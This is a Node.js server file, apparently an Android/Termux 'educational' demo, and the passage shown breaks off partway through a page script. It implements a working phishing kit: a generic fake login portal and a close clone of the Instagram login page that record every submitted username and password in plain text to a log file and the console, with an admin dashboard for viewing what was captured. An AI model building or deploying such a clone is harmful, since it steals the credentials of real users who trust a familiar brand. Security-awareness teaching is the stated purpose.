/**
 * airIsLeaking — Educational WiFi Packet-Sniffing Demo Server
 * ─────────────────────────────────────────────────────────────
 * Run with:  node server.js
 * Designed for Termux on Android (no root needed).
 *
 * Routes:
 *   GET  /                  → Demo login page (captures any credentials)
 *   POST /submit            → Capture handler → redirects to /chat
 *   GET  /chat              → LAN group chat (polling)
 *   GET  /instagram         → Instagram-style phishing clone
 *   POST /instagram-submit  → Capture handler → redirects to /chat
 *   GET  /admin             → Admin login gate
 *   POST /admin-login       → Admin auth
 *   GET  /admin/dashboard   → Captured credentials viewer (auth required)
 *   GET  /admin-logout      → Clear admin session
 */

'use strict';

const express = require('express');
const os      = require('os');
const fs      = require('fs');
const path    = require('path');
const crypto  = require('crypto');
const cfg     = require('./config');

const app      = express();
const PORT     = cfg.PORT;
const LOG_FILE = path.join(__dirname, 'captured.log');

// ════════════════════════════════════════════════════════════════════════════
// ── In-memory stores
// ════════════════════════════════════════════════════════════════════════════
const chatMessages  = [];   // { ts, ip, name, text }
const capturedCreds = [];   // { ts, ip, source, username, password, rawBody, headers }
const adminSessions = new Set(); // simple token-based sessions

// ════════════════════════════════════════════════════════════════════════════
// ── Middleware
// ════════════════════════════════════════════════════════════════════════════
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ── Full request logger (the "this is what an attacker captures" view)
app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const line =
    `\n[${new Date().toISOString()}] ${req.method} ${req.url}  IP:${ip}\n` +
    `  Headers: ${JSON.stringify(req.headers)}\n` +
    `  Body:    ${JSON.stringify(req.body)}\n` +
    '─'.repeat(80) + '\n';
  fs.appendFile(LOG_FILE, line, () => {});
  next();
});

// ════════════════════════════════════════════════════════════════════════════
// ── Helpers
// ════════════════════════════════════════════════════════════════════════════
function getLanIP() {
  for (const ifaces of Object.values(os.networkInterfaces())) {
    for (const i of ifaces) {
      if (i.family === 'IPv4' && !i.internal) return i.address;
    }
  }
  return '0.0.0.0';
}

// HTML-escape for injecting values into HTML
function esc(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// Capture helper — stores + logs any credential submission
function capture(req, source) {
  const ip       = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ts       = new Date().toISOString();
  const username = String(req.body?.username ?? req.body?.email ?? '');
  const password = String(req.body?.password ?? '');
  const rawBody  = new URLSearchParams(req.body).toString();
  const headers  = JSON.stringify(req.headers, null, 2);

  const entry = { ts, ip, source, username, password, rawBody, headers };
  capturedCreds.push(entry);

  const line =
    `\n${'='.repeat(60)}\n` +
    `SOURCE:   ${source}\n` +
    `TIME:     ${ts}\n` +
    `IP:       ${ip}\n` +
    `USERNAME: ${username}\n` +
    `PASSWORD: ${password}\n` +
    `RAW BODY: ${rawBody}\n` +
    `HEADERS:\n${headers}\n` +
    '='.repeat(60) + '\n';
  fs.appendFile(LOG_FILE, line, () => {});
  console.log(`[CAPTURED] ${source} | ${ts} | IP:${ip} | user:${username} | pass:${password}`);

  return entry;
}

// Simple cookie parser (no dependency)
function parseCookies(req) {
  const map = {};
  const header = req.headers.cookie || '';
  header.split(';').forEach(c => {
    const [k, ...v] = c.trim().split('=');
    if (k) map[k.trim()] = decodeURIComponent(v.join('='));
  });
  return map;
}

// Admin auth middleware
function requireAdmin(req, res, next) {
  const cookies = parseCookies(req);
  if (adminSessions.has(cookies.adminToken)) return next();
  res.redirect('/admin');
}


// ════════════════════════════════════════════════════════════════════════════
//
//  PAGE TEMPLATES (shared CSS tokens)
//
// ════════════════════════════════════════════════════════════════════════════




// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /  — Generic demo login (root landing page)
// ════════════════════════════════════════════════════════════════════════════
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SecurePortal — Sign In</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Inter', -apple-system, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    background: #0f0f13;
    background-image:
      radial-gradient(ellipse 80% 60% at 50% -10%, rgba(79,70,229,0.18) 0%, transparent 70%),
      radial-gradient(ellipse 60% 40% at 80% 110%, rgba(124,58,237,0.12) 0%, transparent 60%);
  }
  .card {
    width: 100%;
    max-width: 400px;
    background: rgba(255,255,255,0.035);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 16px;
    padding: 40px 36px 32px;
    backdrop-filter: blur(12px);
  }
  /* Logo */
  .logo-area { text-align: center; margin-bottom: 28px; }
  .logo-icon {
    display: inline-flex; align-items: center; justify-content: center;
    width: 46px; height: 46px;
    background: linear-gradient(135deg, #4f46e5, #7c3aed);
    border-radius: 12px;
    margin-bottom: 14px;
    box-shadow: 0 0 20px rgba(79,70,229,0.4);
  }
  .logo-icon svg { width: 24px; height: 24px; }
  .logo-name { font-size: 1.1rem; font-weight: 700; color: #fff; letter-spacing: -0.2px; }
  .logo-sub { font-size: 0.8rem; color: rgba(255,255,255,0.35); margin-top: 3px; }

  /* Fields */
  .field { margin-bottom: 14px; }
  .field label { display: block; font-size: 0.78rem; font-weight: 500; color: rgba(255,255,255,0.5); margin-bottom: 6px; letter-spacing: 0.2px; }
  .field input {
    width: 100%;
    padding: 12px 14px;
    background: rgba(255,255,255,0.06);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 9px;
    font-family: 'Inter', sans-serif;
    font-size: 0.95rem;
    color: #fff;
    outline: none;
    transition: border-color .15s, background .15s, box-shadow .15s;
    -webkit-appearance: none;
  }
  .field input::placeholder { color: rgba(255,255,255,0.2); }
  .field input:focus {
    border-color: rgba(99,102,241,0.7);
    background: rgba(255,255,255,0.09);
    box-shadow: 0 0 0 3px rgba(79,70,229,0.15);
  }
  .pw-wrap { position: relative; }
  .pw-wrap input { padding-right: 46px; }
  .pw-toggle {
    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
    background: none; border: none; cursor: pointer;
    color: rgba(255,255,255,0.3); padding: 4px;
    transition: color .15s;
  }
  .pw-toggle:hover { color: rgba(255,255,255,0.7); }

  /* Row: remember + forgot */
  .meta-row {
    display: flex; align-items: center; justify-content: space-between;
    margin: 8px 0 20px; font-size: 0.78rem;
  }
  .remember { display: flex; align-items: center; gap: 6px; color: rgba(255,255,255,0.4); cursor: pointer; user-select: none; }
  .remember input { accent-color: #6366f1; cursor: pointer; }
  .forgot { color: #818cf8; text-decoration: none; font-weight: 500; }
  .forgot:hover { text-decoration: underline; }

  /* Button */
  .btn {
    width: 100%; padding: 13px;
    background: #4f46e5;
    color: #fff; border: none; border-radius: 9px;
    font-family: 'Inter', sans-serif;
    font-size: 0.95rem; font-weight: 600;
    cursor: pointer;
    display: flex; align-items: center; justify-content: center; gap: 8px;
    transition: background .15s, transform .1s, box-shadow .15s;
    box-shadow: 0 4px 14px rgba(79,70,229,0.35);
  }
  .btn:not(:disabled):hover { background: #4338ca; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(79,70,229,0.45); }
  .btn:disabled { opacity: 0.35; cursor: not-allowed; box-shadow: none; transform: none; }
  .spn {
    width: 16px; height: 16px;
    border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
    border-radius: 50%;
    animation: spin .6s linear infinite;
    display: none; flex-shrink: 0;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* Divider + sign up */
  .divider { display: flex; align-items: center; gap: 12px; margin: 22px 0; }
  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: rgba(255,255,255,0.07); }
  .divider span { font-size: 0.72rem; color: rgba(255,255,255,0.25); }
  .signup { text-align: center; font-size: 0.8rem; color: rgba(255,255,255,0.35); }
  .signup a { color: #818cf8; font-weight: 500; text-decoration: none; }
  .signup a:hover { text-decoration: underline; }

  /* Nav */
  .nav { margin-top: 28px; display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; }
  .nav a {
    font-size: 0.7rem; padding: 4px 10px;
    border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
    color: rgba(255,255,255,0.35); text-decoration: none;
    transition: border-color .15s, color .15s;
  }
  .nav a:hover { border-color: rgba(99,102,241,0.5); color: #a5b4fc; }
</style>
</head>
<body>
<div class="card">
  <div class="logo-area">
    <div class="logo-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.25C17.25 22.15 21 17.25 21 12V7z"/>
      </svg>
    </div>
    <div class="logo-name">SecurePortal</div>
    <div class="logo-sub">Sign in to your account</div>
  </div>

  <form method="POST" action="/submit" id="spForm">
    <div class="field">
      <label for="sp-user">Email or username</label>
      <input type="text" id="sp-user" name="username" placeholder="you@example.com" autocomplete="username" required>
    </div>
    <div class="field">
      <label for="sp-pass">Password</label>
      <div class="pw-wrap">
        <input type="password" id="sp-pass" name="password" placeholder="••••••••" autocomplete="current-password" required>
        <button type="button" class="pw-toggle" id="pw-toggle" aria-label="Show/hide password">
          <svg id="eye-svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
    </div>

    <div class="meta-row">
      <label class="remember"><input type="checkbox" name="remember"> Remember me</label>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <button type="submit" class="btn" id="sp-btn" disabled>
      <div class="spn" id="sp-spn"></div>
      <span id="sp-txt">Sign in</span>
    </button>
  </form>

  <div class="divider"><span>or</span></div>
  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>

  <div class="nav">
    <a href="/instagram">Instagram</a>
    <a href="/google">Google</a>
    <a href="/chat">Chat</a>
    <a href="/admin">Admin</a>
  </div>
</div>

<script>
  var u   = document.getElementById('sp-user');
  var p   = document.getElementById('sp-pass');
  var btn = document.getElementById('sp-btn');
  var spn = document.getElementById('sp-spn');
  var txt = document.getElementById('sp-txt');
  var frm = document.getElementById('spForm');
  var eye = document.getElementById('pw-toggle');

  function check() { btn.disabled = !(u.value.trim() && p.value); }
  u.addEventListener('input', check);
  p.addEventListener('input', check);

  eye.addEventListener('click', function() {
    var show = p.type === 'password';
    p.type = show ? 'text' : 'password';
    document.getElementById('eye-svg').innerHTML = show
      ? '<line x1="1" y1="1" x2="23" y2="23"/><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>'
      : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
  });

  frm.addEventListener('submit', function(e) {
    if (btn.disabled) { e.preventDefault(); return; }
    spn.style.display = 'block';
    txt.textContent = 'Signing in\u2026';
    btn.disabled = true;
  });
</script>
</body>
</html>`);
});

app.post('/submit', (req, res) => {
  const username = String(req.body?.username ?? '').trim();
  const password = String(req.body?.password ?? '').trim();
  if (!username || !password) return res.redirect('/');
  capture(req, 'root-login');
  res.redirect('/chat?user=' + encodeURIComponent(username));
});

app.get('/chat', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Chatroom — SecurePortal</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Inter', -apple-system, sans-serif;
    background: #0b0f19;
    color: #f1f5f9;
    height: 100vh;
    height: 100dvh;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    overscroll-behavior: none;
  }
  header {
    background: #111827;
    border-bottom: 1px solid #1f2937;
    padding: 12px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-shrink: 0;
  }
  .header-left {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .status-dot {
    width: 8px; height: 8px;
    background: #10b981;
    border-radius: 50%;
    box-shadow: 0 0 8px #10b981;
  }
  header h1 { font-size: 0.95rem; font-weight: 600; letter-spacing: 0.2px; color: #f9fafb; }
  header .sub { font-size: 0.75rem; color: #9ca3af; margin-top: 1px; }

  header a.logout-btn {
    font-size: 0.75rem;
    color: #9ca3af;
    text-decoration: none;
    padding: 6px 12px;
    border: 1px solid #374151;
    border-radius: 6px;
    transition: all 0.15s ease;
  }
  header a.logout-btn:hover {
    color: #f9fafb;
    background: #1f2937;
    border-color: #4b5563;
  }

  #messages {
    flex: 1;
    overflow-y: auto;
    padding: 20px;
    display: flex;
    flex-direction: column;
    gap: 14px;
    -webkit-overflow-scrolling: touch;
  }

  /* Bubble styles */
  .msg-wrapper {
    display: flex;
    flex-direction: column;
    max-width: 75%;
    align-self: flex-start;
  }
  .msg-wrapper.self {
    align-self: flex-end;
  }
  .msg-meta {
    font-size: 0.7rem;
    color: #6b7280;
    margin-bottom: 4px;
    display: flex;
    gap: 6px;
    align-items: center;
  }
  .msg-wrapper.self .msg-meta {
    justify-content: flex-end;
  }
  .msg-meta .name { font-weight: 600; color: #60a5fa; }
  .msg-wrapper.self .msg-meta .name { color: #a78bfa; }
  .msg-meta .ip { color: #4b5563; font-size: 0.65rem; }
  
  .msg-bubble {
    background: #1f2937;
    border-radius: 12px;
    border-top-left-radius: 2px;
    padding: 10px 14px;
    font-size: 0.88rem;
    line-height: 1.45;
    color: #e5e7eb;
    word-break: break-word;
    border: 1px solid rgba(255,255,255,0.02);
  }
  .msg-wrapper.self .msg-bubble {
    background: #312e81;
    border-radius: 12px;
    border-top-right-radius: 2px;
    border-top-left-radius: 12px;
    color: #f3f4f6;
  }

  .empty {
    color: #4b5563;
    font-size: 0.85rem;
    text-align: center;
    margin-top: 40px;
  }

  /* Footer and Inputs */
  footer {
    background: #111827;
    border-top: 1px solid #1f2937;
    padding: 12px 16px;
    display: flex;
    flex-direction: column;
    gap: 8px;
    flex-shrink: 0;
  }

  .footer-row-top {
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .footer-row-bottom {
    display: flex;
    gap: 8px;
    align-items: center;
  }

  .name-badge-container {
    display: flex;
    align-items: center;
    background: #1f2937;
    border: 1px solid #374151;
    border-radius: 8px;
    padding: 5px 12px;
    font-size: 0.78rem;
    color: #9ca3af;
    width: 100%;
    max-width: 180px;
  }
  .name-badge-container label {
    font-weight: 500;
    margin-right: 8px;
    font-size: 0.72rem;
    text-transform: uppercase;
    letter-spacing: 0.3px;
    flex-shrink: 0;
  }
  .name-badge-container input {
    background: transparent;
    border: none;
    color: #f3f4f6;
    font-weight: 600;
    outline: none;
    width: 100%;
    font-family: inherit;
    font-size: 0.82rem;
  }

  .msg-input-wrap {
    flex: 1;
  }
  .msg-input-wrap input {
    width: 100%;
    background: #1f2937;
    border: 1px solid #374151;
    border-radius: 8px;
    color: #f3f4f6;
    padding: 10px 14px;
    font-family: inherit;
    font-size: 0.9rem;
    outline: none;
    transition: border-color 0.15s ease;
  }
  .msg-input-wrap input:focus {
    border-color: #4f46e5;
  }

  footer button {
    background: #4f46e5;
    border: none;
    border-radius: 8px;
    color: #fff;
    padding: 10px 16px;
    height: 38px;
    font-family: inherit;
    font-size: 0.88rem;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.15s ease;
    white-space: nowrap;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
  footer button:hover {
    background: #4338ca;
  }

  /* Responsive styles */
  @media (max-width: 480px) {
    header { padding: 10px 14px; }
    header h1 { font-size: 0.88rem; }
    header .sub { font-size: 0.7rem; }
    #messages { padding: 14px 12px; gap: 10px; }
    .msg-wrapper { max-width: 85%; }
    footer { padding: 8px 10px 12px; gap: 6px; }
    .name-badge-container { max-width: 100%; }
    .footer-row-top { flex-direction: column; align-items: stretch; }
    .footer-row-bottom { width: 100%; }
    
    /* Shorten button content on small screens to save horizontal space */
    footer button span { display: none; }
    footer button { padding: 10px; width: 42px; }
  }
</style>
</head>
<body>
<header>
  <div class="header-left">
    <div class="status-dot"></div>
    <div>
      <h1>LAN Chatroom</h1>
      <div class="sub" id="chat-sub">Group chat</div>
    </div>
  </div>
  <a href="/" class="logout-btn">Log out</a>
</header>
<div id="messages"><p class="empty">No messages yet — say something!</p></div>
<footer>
  <div class="footer-row-top">
    <div class="name-badge-container">
      <label for="nameInput">Name</label>
      <input type="text" id="nameInput" placeholder="Your name" maxlength="30" autocomplete="off" value="anon">
    </div>
  </div>
  <div class="footer-row-bottom">
    <div class="msg-input-wrap">
      <input type="text" id="msgInput" placeholder="Type a message…" maxlength="300" autocomplete="off">
    </div>
    <button onclick="sendMsg()">
      <span>Send</span>
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <line x1="22" y1="2" x2="11" y2="13"/>
        <polygon points="22 2 15 22 11 13 2 9 22 2"/>
      </svg>
    </button>
  </div>
</footer>
<script>
  let lastCount = 0;

  async function poll() {
    try {
      const r = await fetch('/api/messages');
      const data = await r.json();
      if (data.length !== lastCount) { lastCount = data.length; render(data); }
    } catch(e) {}
    setTimeout(poll, 2000);
  }

  function render(msgs) {
    const box = document.getElementById('messages');
    if (!msgs.length) { box.innerHTML = '<p class="empty">No messages yet — say something!</p>'; return; }
    
    const currentUserName = document.getElementById('nameInput').value.trim();
    const shouldScroll = (box.scrollHeight - box.scrollTop - box.clientHeight) < 80;
    
    box.innerHTML = msgs.map(m => {
      const isSelf = m.name.trim().toLowerCase() === currentUserName.toLowerCase();
      const wrapClass = isSelf ? 'msg-wrapper self' : 'msg-wrapper';
      
      return '<div class="' + wrapClass + '">' +
        '<div class="msg-meta">' +
          '<span class="name">' + h(m.name) + '</span>' +
          ' <span class="ip">(' + h(m.ip) + ')</span>' +
          ' &middot; ' + formatTime(m.ts) +
        '</div>' +
        '<div class="msg-bubble">' + h(m.text) + '</div>' +
      '</div>';
    }).join('');
    
    if (shouldScroll) {
      scrollToBottom();
    }
  }

  function scrollToBottom() {
    const box = document.getElementById('messages');
    box.scrollTop = box.scrollHeight;
  }

  function formatTime(isoStr) {
    try {
      const d = new Date(isoStr);
      return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    } catch(e) {
      return '';
    }
  }

  async function sendMsg() {
    const nameEl = document.getElementById('nameInput');
    const msgEl  = document.getElementById('msgInput');
    const text   = msgEl.value.trim();
    const name   = nameEl.value.trim() || 'anon';
    if (!text) return;
    msgEl.value = '';
    try {
      await fetch('/api/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text, name })
      });
      scrollToBottom();
    } catch(e) {}
  }

  document.getElementById('msgInput').addEventListener('keydown', e => {
    if (e.key === 'Enter') sendMsg();
  });

  // Auto-scroll when keyboard appears (input gets focus)
  document.getElementById('msgInput').addEventListener('focus', () => {
    setTimeout(scrollToBottom, 200);
  });
  document.getElementById('nameInput').addEventListener('focus', () => {
    setTimeout(scrollToBottom, 200);
  });

  function h(s) {
    return String(s ?? '')
      .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  poll();

  // Pre-fill name from login redirect
  (function() {
    var params = new URLSearchParams(window.location.search);
    var user = params.get('user');
    if (user) {
      var ni = document.getElementById('nameInput');
      if (ni) ni.value = user;
      document.getElementById('chat-sub').textContent = 'Signed in as ' + user;
    }
  })();
</script>
</body>
</html>`);
});



// ════════════════════════════════════════════════════════════════════════════
// ── Chat API
// ════════════════════════════════════════════════════════════════════════════
app.get('/api/messages', (req, res) => res.json(chatMessages));

app.post('/api/messages', (req, res) => {
  const text = String(req.body?.text ?? '').trim().slice(0, 300);
  if (!text) return res.status(400).json({ error: 'empty' });
  const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const name = String(req.body?.name ?? 'anon').trim().slice(0, 30) || 'anon';
  chatMessages.push({ ts: new Date().toISOString(), ip, name, text });
  res.json({ ok: true });
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /instagram  — Instagram-style phishing clone
// ════════════════════════════════════════════════════════════════════════════
app.get('/instagram', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 12px;
  }
  .wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
    max-width: 350px;
  }
  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 40px 40px 28px;
    width: 100%;
    text-align: center;
  }
  .logo-wrap {
    margin-bottom: 28px;
  }
  .logo-svg {
    width: 175px;
    height: 51px;
  }
  .field-wrap {
    position: relative;
    margin-bottom: 6px;
  }
  .field-wrap input {
    width: 100%;
    padding: 9px 10px 7px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 12px;
    color: #262626;
    outline: none;
    transition: border-color .1s;
    caret-color: #262626;
  }
  .field-wrap input::placeholder { color: #8e8e8e; font-size: 12px; }
  .field-wrap input:focus { border-color: #a8a8a8; }
  .pw-wrap { position: relative; }
  .pw-wrap input { padding-right: 52px; }
  .show-btn {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    font-size: 13px;
    font-weight: 600;
    color: #262626;
    cursor: pointer;
    padding: 0;
    line-height: 1;
  }
  .login-btn {
    width: 100%;
    margin-top: 8px;
    padding: 7px 16px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity .2s;
  }
  .login-btn:hover { opacity: 0.8; }
  .login-btn:disabled { opacity: 0.5; cursor: default; }
  .divider {
    display: flex;
    align-items: center;
    gap: 18px;
    margin: 18px 0 18px;
  }
  .divider::before, .divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }
  .divider span {
    font-size: 13px;
    font-weight: 600;
    color: #8e8e8e;
    letter-spacing: 1px;
  }
  .fb-login {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-size: 14px;
    font-weight: 600;
    color: #385185;
    cursor: pointer;
    background: none;
    border: none;
    width: 100%;
    padding: 0;
    margin-bottom: 16px;
  }
  .fb-login:hover { color: #1a3a6e; }
  .forgot {
    display: block;
    margin-top: 4px;
    font-size: 12px;
    color: #00376b;
    text-decoration: none;
  }
  .forgot:hover { color: #1a1a1a; }
  .card2 {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 16px 40px;
    width: 100%;
    text-align: center;
    margin-top: 10px;
    font-size: 14px;
    color: #262626;
  }
  .card2 a { color: #0095f6; font-weight: 600; text-decoration: none; }
  .get-app {
    margin-top: 20px;
    text-align: center;
  }
  .get-app p {
    font-size: 14px;
    color: #262626;
    margin-bottom: 14px;
  }
  .store-badges {
    display: flex;
    gap: 8px;
    justify-content: center;
  }
  .badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: #000;
    color: #fff;
    border-radius: 6px;
    padding: 5px 10px;
    text-decoration: none;
    border: 1px solid #333;
  }
  .badge svg { flex-shrink: 0; }
  .badge-text { line-height: 1.15; }
  .badge-text .top { font-size: 9px; }
  .badge-text .bottom { font-size: 13px; font-weight: 600; }
  footer {
    margin-top: 40px;
    text-align: center;
    width: 100%;
    max-width: 350px;
  }
  .footer-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 12px;
    margin-bottom: 14px;
  }
  .footer-links a {
    font-size: 11px;
    color: #8e8e8e;
    text-decoration: none;
  }
  .footer-links a:hover { text-decoration: underline; }
  .footer-copy {
    font-size: 11px;
    color: #8e8e8e;
    text-transform: uppercase;
    letter-spacing: 0.3px;
  }

  @media (max-width: 420px) {
    body { padding: 0; align-items: stretch; }
    .wrap { max-width: 100%; }
    .card {
      border-left: none; border-right: none; border-radius: 0;
      padding: 32px 20px 24px;
    }
    .card2 { border-left: none; border-right: none; border-radius: 0; padding: 16px 20px; }
    .store-badges { flex-direction: column; align-items: center; }
    .field-wrap input { font-size: 14px; padding: 11px 12px 9px; min-height: 46px; }
    .login-btn { padding: 9px 16px; font-size: 15px; }
    .footer-links { gap: 8px; }
  }
</style>
</head>
<body>
<div class="wrap">

  <div class="card">
    <!-- Instagram wordmark as inline SVG -->
    <div class="logo-wrap">
      <svg class="logo-svg" viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" style="stop-color:#f09433"/>
            <stop offset="25%" style="stop-color:#e6683c"/>
            <stop offset="50%" style="stop-color:#dc2743"/>
            <stop offset="75%" style="stop-color:#cc2366"/>
            <stop offset="100%" style="stop-color:#bc1888"/>
          </linearGradient>
        </defs>
        <text x="0" y="44" font-family="Grand Hotel, cursive, serif" font-size="46" fill="url(#ig-grad)">Instagram</text>
      </svg>
    </div>

    <form method="POST" action="/instagram-submit" id="igForm">
      <div class="field-wrap">
        <input type="text" name="username" id="ig-user" placeholder="Phone number, username, or email" autocomplete="off" autocapitalize="off" autocorrect="off">
      </div>
      <div class="field-wrap pw-wrap">
        <input type="password" name="password" id="ig-pass" placeholder="Password" autocomplete="current-password">
        <button type="button" class="show-btn" onclick="togglePw(this)">Show</button>
      </div>
      <button type="submit" class="login-btn" id="ig-submit">Log in</button>
    </form>

    <div class="divider"><span>OR</span></div>

    <button class="fb-login" type="button">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078V12.07h3.047V9.41c0-3.025 1.791-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.492h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
      Log in with Facebook
    </button>

    <a class="forgot" href="#">Forgot password?</a>
  </div>

  <div class="card2">
    Don't have an account? <a href="#">Sign up</a>
  </div>

  <div class="get-app">
    <p>Get the app.</p>
    <div class="store-badges">
      <a href="#" class="badge">
        <svg width="18" height="22" viewBox="0 0 814 1000" fill="white"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105-42.3-150.3-109.7S2 499.9 2 367.7c0-112.7 56.4-172.1 168-172.1 75.9 0 139.4 50.7 185.3 50.7 43.3 0 114.1-53.7 199.1-53.7zm-136-133c.3-44.2-17.6-87.4-50-115.4-32.2-27.9-72.3-44.8-112.3-44.8h-6.4c-43.4 0-84 19.6-114.3 51.5C354 127.1 337.1 173 338 220.5c0 6.6.6 13.1 1 17.5 4.8.4 9.8.6 14.8.6 39.5 0 82.1-19.1 112.6-52.6 32.2-35.4 49.8-82.3 49.6-130 0 0 272.1 0 272.1 144.9z"/></svg>
        <div class="badge-text"><div class="top">Download on the</div><div class="bottom">App Store</div></div>
      </a>
      <a href="#" class="badge">
        <svg width="18" height="20" viewBox="0 0 512 512" fill="white"><path d="M325.3 234.3L104.6 13l280.8 161.2-60.1 60.1zM47 0C34 6.8 25.3 19.2 25.3 35.3v441.3c0 16.1 8.7 28.5 21.7 35.3l2.2 1.3 247.2-247v-5.8L47 0zm325.1 275.4l-84.4 84.4 2.5 1.4 99.7 56.9c28.2 16.1 56.4 1.5 56.4-30.7 0-15.9-8.9-30.5-24.1-38.7L372.1 275.4zM104.6 499l221-221-60.1-60.1L46.3 478.7l58.3 20.3z"/></svg>
        <div class="badge-text"><div class="top">Get it on</div><div class="bottom">Google Play</div></div>
      </a>
    </div>
  </div>

  <footer>
    <div class="footer-links">
      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
      <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a>
      <a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a>
      <a href="#">Threads</a><a href="#">Contact Uploading &amp; Non-Users</a>
      <a href="#">Meta Verified</a>
    </div>
    <div class="footer-copy">© 2024 Instagram from Meta</div>
  </footer>

</div>

<script>
  function togglePw(btn) {
    const inp = document.getElementById('ig-pass');
    if (inp.type === 'password') { inp.type = 'text'; btn.textContent = 'Hide'; }
    else { inp.type = 'password'; btn.textContent = 'Show'; }
  }
  // Dim the button when fields are empty (matches real Instagram UX)
